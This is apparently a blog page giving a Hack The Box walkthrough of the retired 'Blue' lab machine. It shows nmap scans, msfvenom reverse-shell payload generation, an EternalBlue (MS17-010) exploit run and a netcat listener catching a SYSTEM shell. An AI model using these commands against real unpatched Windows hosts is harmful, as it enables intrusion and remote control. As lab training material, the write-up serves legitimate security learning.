@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Blue | Welcome to another retired Hack The Box named Blue. This particular box demonstrates the severity of the EternalBlue exploit, which has been used...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Blue</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-02-12 19:07:00+00:00">Wed 12 February 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Blue.html">Blue</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Blue.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Welcome to another retired Hack The Box named Blue. This particular box demonstrates the severity of the EternalBlue exploit, which has been used in multiple large-scale ransomware and crypto-mining attacks since it was leaked publicly in March 2017. </p>
+<h1 id="initial-nmap">Initial Nmap</h1>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nmap -p- -sC -sV <span class="m">10</span>.10.10.40                                                                                                                                                     
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 19:01 GMT</span>
+<span class="go">Nmap scan report for 10.10.10.40</span>
+<span class="go">Host is up (0.019s latency).</span>
+<span class="go">Not shown: 65526 closed ports</span>
+<span class="go">PORT      STATE SERVICE      VERSION</span>
+<span class="go">135/tcp   open  msrpc        Microsoft Windows RPC</span>
+<span class="go">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span>
+<span class="go">445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span>
+<span class="go">49152/tcp open  unknown</span>
+<span class="go">49153/tcp open  unknown</span>
+<span class="go">49154/tcp open  unknown</span>
+<span class="go">49155/tcp open  unknown</span>
+<span class="go">49156/tcp open  unknown</span>
+<span class="go">49157/tcp open  unknown</span>
+<span class="go">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_smb2-time: Protocol negotiation failed (SMB2) </span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 199.25 seconds</span>
+</pre></div>
+
+
+<p>Port 445 (smb) seems to produce some interesting information, so let's explore port 445 in more details:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/blue#</span> nmap -p <span class="m">445</span> -sC -sV <span class="m">10</span>.10.10.40
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 22:58 GMT</span>
+<span class="go">Nmap scan report for 10.10.10.40</span>
+<span class="go">Host is up (0.023s latency).</span>
+
+<span class="go">PORT    STATE SERVICE      VERSION</span>
+<span class="go">445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span>
+<span class="go">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_clock-skew: mean: 50s, deviation: 2s, median: 48s</span>
+<span class="go">| smb-os-discovery: </span>
+<span class="go">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span>
+<span class="go">|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional</span>
+<span class="go">|   Computer name: haris-PC</span>
+<span class="go">|   NetBIOS computer name: HARIS-PC\x00</span>
+<span class="go">|   Workgroup: WORKGROUP\x00</span>
+<span class="go">|_  System time: 2020-02-12T22:59:55+00:00</span>
+<span class="go">| smb-security-mode: </span>
+<span class="go">|   account_used: guest</span>
+<span class="go">|   authentication_level: user</span>
+<span class="go">|   challenge_response: supported</span>
+<span class="go">|_  message_signing: disabled (dangerous, but default)</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   2.02: </span>
+<span class="go">|_    Message signing enabled but not required</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2020-02-12T22:59:54</span>
+<span class="go">|_  start_date: 2020-02-12T22:11:17</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 15.69 seconds </span>
+</pre></div>
+
+
+<p>with this nmap runs all the available SMB scripts and scan for related vulnerabilities:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nmap -p <span class="m">445</span> --script vuln -sV <span class="m">10</span>.10.10.40
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-12 20:32 GMT</span>
+<span class="go">Nmap scan report for 10.10.10.40</span>
+<span class="go">Host is up (0.018s latency).</span>
+
+<span class="go">PORT    STATE SERVICE      VERSION</span>
+<span class="go">445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span>
+<span class="go">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span>
+<span class="go">Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">|_smb-vuln-ms10-054: false</span>
+<span class="go">|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND</span>
+<span class="go">| smb-vuln-ms17-010: </span>
+<span class="go">|   VULNERABLE:</span>
+<span class="go">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span>
+<span class="go">|     State: VULNERABLE</span>
+<span class="go">|     IDs:  CVE:CVE-2017-0143</span>
+<span class="go">|     Risk factor: HIGH</span>
+<span class="go">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span>
+<span class="go">|        servers (ms17-010).</span>
+<span class="go">|           </span>
+<span class="go">|     Disclosure date: 2017-03-14</span>
+<span class="go">|     References:</span>
+<span class="go">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span>
+<span class="go">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span>
+<span class="go">|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 30.73 seconds</span>
+</pre></div>
+
+
+<p>From the above output it's clear that the machine in question is vulnerable to <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010">MS17-010</a>, aka EthernalBlue, which could allow remote code execution if an attacker sends specially crafted messages to a Microsoft Server Message Block 1.0 (SMBv1) server.</p>
+<p>Let's see how we can exploit that. </p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> searchsploit ms17-010<span class="p">|</span>grep -i <span class="s2">&quot;windows 7&quot;</span>
+<span class="go">Microsoft Windows 7/2008 R2 - &#39;EternalBlue&#39; SMB Remote Code Execution (MS17-010)                                                                     | exploits/windows/remote/42031.py</span>
+<span class="go">Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - &#39;EternalBlue&#39; SMB Remote Code Execution (MS17-010)                                                 | exploits/windows/remote/42315.py</span>
+</pre></div>
+
+
+<p>I struggled a bit with both the above exploits because they require for you to get some parameters right, such us pipes. In my opinion they are not well documented and getting the parameters right is quite time consuming. Since EthernalBlue is very well known, there are a lot of scripts out there so I decided to try something different and easier. This project https://github.com/3ndG4me/AutoBlue-MS17-010.git ended up being what I was looking for. </p>
+<p>First thing first, I clone the project:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/blue#</span> git clone  https://github.com/3ndG4me/AutoBlue-MS17-010.git                                                                                    
+<span class="go">Cloning into &#39;AutoBlue-MS17-010&#39;...                                                            </span>
+<span class="go">remote: Enumerating objects: 26, done.                                                                                                                                                        </span>
+<span class="go">remote: Counting objects: 100% (26/26), done.                                                  </span>
+<span class="go">remote: Compressing objects: 100% (25/25), done.                                                                                                                                              </span>
+<span class="go">remote: Total 102 (delta 12), reused 5 (delta 1), pack-reused 76                                                                                                                              </span>
+<span class="go">Receiving objects: 100% (102/102), 77.30 KiB | 210.00 KiB/s, done.                                                                                                                            </span>
+<span class="go">Resolving deltas: 100% (52/52), done.   </span>
+</pre></div>
+
+
+<p>Then I ran the shell_prep.sh script:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/blue/AutoBlue-MS17-010/shellcode#</span> ./shell_prep.sh                                                                                                    
+<span class="go">                 _.-;;-._                      </span>
+<span class="go">          &#39;-..-&#39;|   ||   |                     </span>
+<span class="go">          &#39;-..-&#39;|_.-;;-._|                     </span>
+<span class="go">          &#39;-..-&#39;|   ||   |                     </span>
+<span class="go">          &#39;-..-&#39;|_.-&#39;&#39;-._|                                                                     </span>
+<span class="go">Eternal Blue Windows Shellcode Compiler                                                        </span>
+
+<span class="go">Let&#39;s compile them windoos shellcodezzz                                                        </span>
+
+<span class="go">Compiling x64 kernel shellcode                                                                 </span>
+<span class="go">Compiling x86 kernel shellcode                                                                 </span>
+<span class="go">kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)                                                                                               </span>
+<span class="go">Y                                              </span>
+<span class="go">LHOST for reverse connection:                                                                  </span>
+<span class="go">10.10.14.3                                     </span>
+<span class="go">LPORT you want x64 to listen on:                                                               </span>
+<span class="go">9990                                           </span>
+<span class="go">LPORT you want x86 to listen on:                                                               </span>
+<span class="go">9991                                           </span>
+<span class="go">Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell                                                                                                                   </span>
+<span class="go">1                                              </span>
+<span class="go">Type 0 to generate a staged payload or 1 to generate a stageless payload                                                                                                                      </span>
+<span class="go">1                                              </span>
+<span class="go">Generating x64 cmd shell (stageless)...                                                        </span>
+
+<span class="go">msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.3 LPORT=9990                                                                                </span>
+<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                                        </span>
+<span class="go">[-] No arch selected, selecting arch: x64 from the payload                                     </span>
+<span class="go">No encoder or badchars specified, outputting raw payload                                       </span>
+<span class="go">Payload size: 460 bytes                        </span>
+<span class="go">Saved as: sc_x64_msf.bin                       </span>
+
+<span class="go">Generating x86 cmd shell (stageless)...                                                        </span>
+
+<span class="go">msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.14.3 LPORT=9991                                                                                    </span>
+<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload                                                                                                        </span>
+<span class="go">[-] No arch selected, selecting arch: x86 from the payload                                     </span>
+<span class="go">No encoder or badchars specified, outputting raw payload                                       </span>
+<span class="go">Payload size: 324 bytes                        </span>
+<span class="go">Saved as: sc_x86_msf.bin                       </span>
+
+<span class="go">MERGING SHELLCODE WOOOO!!!                     </span>
+<span class="go">DONE                           </span>
+</pre></div>
+
+
+<p>I can see few binary files being generated:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/blue/AutoBlue-MS17-010/shellcode#</span> ll                                                                                                                 
+<span class="go">total 80                                       </span>
+<span class="go">-rw-rw-r-- 1 root root 20305 Feb 13 11:41 eternalblue_kshellcode_x64.asm                                                                                                                      </span>
+<span class="go">-rw-rw-r-- 1 root root 19862 Feb 13 11:41 eternalblue_kshellcode_x86.asm                                                                                                                      </span>
+<span class="go">-rw-rw-r-- 1 root root  1589 Feb 13 11:41 eternalblue_sc_merge.py                                                                                                                             </span>
+<span class="go">-rw-rw-r-- 1 root root  2203 Feb 13 11:47 sc_all.bin                                           </span>
+<span class="go">-rw-rw-r-- 1 root root  1232 Feb 13 11:47 sc_x64.bin                                           </span>
+<span class="go">-rw-rw-r-- 1 root root   772 Feb 13 11:46 sc_x64_kernel.bin                                                                                                                                   </span>
+<span class="go">-rw-rw-r-- 1 root root   460 Feb 13 11:46 sc_x64_msf.bin                                       </span>
+<span class="go">-rw-rw-r-- 1 root root   962 Feb 13 11:47 sc_x86.bin                                           </span>
+<span class="go">-rw-rw-r-- 1 root root   638 Feb 13 11:46 sc_x86_kernel.bin                                                                                                                                   </span>
+<span class="go">-rw-rw-r-- 1 root root   324 Feb 13 11:47 sc_x86_msf.bin                                       </span>
+<span class="go">-rwxrwxr-x 1 root root  4556 Feb 13 11:41 shell_prep.sh  </span>
+</pre></div>
+
+
+<p>Then after having set a netcat listener on port 9990 I run the exploit:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:/home/user/Documents/htb/boxes/blue/AutoBlue-MS17-010#</span> python eternalblue_exploit7.py <span class="m">10</span>.10.10.40 shellcode/sc_all.bin 
+<span class="go">shellcode size: 2203                           </span>
+<span class="go">numGroomConn: 13                               </span>
+<span class="go">Target OS: Windows 7 Professional 7601 Service Pack 1                                          </span>
+<span class="go">SMB1 session setup allocate nonpaged pool success                                              </span>
+<span class="go">SMB1 session setup allocate nonpaged pool success                                              </span>
+<span class="go">good response status: INVALID_PARAMETER                                                        </span>
+<span class="go">done </span>
+</pre></div>
+
+
+<p>and netcat shows I got a shell on the windows machine:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lvnp <span class="m">9990</span>
+<span class="go">listening on [any] 9990 ...</span>
+<span class="go">connect to [10.10.14.3] from (UNKNOWN) [10.10.10.40] 49160</span>
+<span class="go">Microsoft Windows [Version 6.1.7601]</span>
+<span class="go">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>
+
+<span class="go">C:\Windows\system32&gt;</span>
+</pre></div>
+
+
+<p>I looked around and found the user.txt in the following location:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Users\haris\Desktop&gt;more user.txt</span>
+<span class="go">more user.txt</span>
+<span class="go">4c****************************a9</span>
+</pre></div>
+
+
+<p>and similarly the root.txt:</p>
+<div class="highlight"><pre><span></span><span class="go">C:\Users\Administrator\Desktop&gt;more root.txt</span>
+<span class="go">more root.txt</span>
+<span class="go">ff****************************17</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Blue.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Blue"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
